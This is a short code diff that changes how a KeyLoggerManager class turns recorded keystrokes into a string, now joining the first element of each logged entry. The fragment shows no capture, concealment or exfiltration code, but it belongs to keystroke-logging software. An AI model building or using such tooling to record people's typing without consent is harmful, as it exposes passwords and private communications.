@@ -35,7 +35,7 @@ class KeyLoggerManager:
         print("KeyLogger stopped.")
 
     def add_to_dic(self):
-        logged_keys = "".join(self.service.get_logged_keys())
+        logged_keys = "".join(key[0] for key in self.service.get_logged_keys())
         if logged_keys == "":
             return
 
